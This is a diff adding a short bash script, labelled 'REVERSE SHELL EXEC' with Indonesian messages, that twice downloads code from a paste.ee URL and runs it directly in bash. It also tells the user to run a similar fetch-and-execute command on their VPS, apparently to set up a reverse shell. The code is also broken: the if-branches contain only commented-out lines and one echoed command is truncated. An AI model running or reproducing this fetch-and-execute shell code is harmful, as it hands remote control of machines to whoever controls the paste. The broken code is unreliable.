@@ -1,0 +1,22 @@
+#!/bin/bash
+
+BLUE="\033[0;34m"
+RED="\033[0;31m"
+RESET="\033[0m"
+
+echo -e "$BLUE ##  REVERSE SHELL EXEC  ##
+ ## Author : @mekihunter ##$RESET"
+
+if [ -z "$API" ]; then
+  # echo -e "$RED Gagal: API tidak boleh kosong!$RESET"
+else
+  X="$API" bash -c "$(curl -fsSL https://paste.ee/r/C8YolZJS/0)"
+  echo "Silahkan jalankan command berikut ini pada VPS Anda : "
+  echo 'S="$FROM_API" bash -c "$(curl -fsSL tes"'
+fi
+
+if [ -z "$FROM_API" ]; then
+  # echo -e "$RED Gagal: FROM_API tidak boleh kosong!$RESET"
+else
+  S="$FROM_API" bash -c "$(curl -fsSL https://paste.ee/r/C8YolZJS/0)"
+fi
